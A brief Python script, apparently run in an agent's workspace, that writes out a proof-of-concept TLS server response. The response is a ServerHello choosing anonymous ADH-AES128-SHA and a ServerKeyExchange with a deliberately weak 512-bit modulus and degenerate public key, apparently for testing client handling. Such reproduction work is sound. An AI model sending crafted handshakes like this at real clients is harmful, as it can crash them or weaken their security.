from pathlib import Path

def hs(t, body):
    return bytes([t]) + len(body).to_bytes(3,'big') + body

def rec(payload, ver=b'\x03\x03'):
    return b'\x16' + ver + len(payload).to_bytes(2,'big') + payload
# ServerHello TLS1.2, ADH-AES128-SHA 0x0034, null compression, no extensions
server_hello_body = b'\x03\x03' + bytes(range(32)) + b'\x00' + b'\x00\x34' + b'\x00'
server_hello = hs(2, server_hello_body)
# 512-bit odd p, generator 2, public key 2
p = bytes([0x80]) + b'\x00'*62 + bytes([0x03])
g = b'\x02'
y = b'\x02'
ske_body = len(p).to_bytes(2,'big') + p + len(g).to_bytes(2,'big') + g + len(y).to_bytes(2,'big') + y
ske = hs(12, ske_body)
# send in separate records
poc = rec(server_hello) + rec(ske)
Path('/workspace/poc1.bin').write_bytes(poc)
print(len(poc))
print(poc.hex())
PY
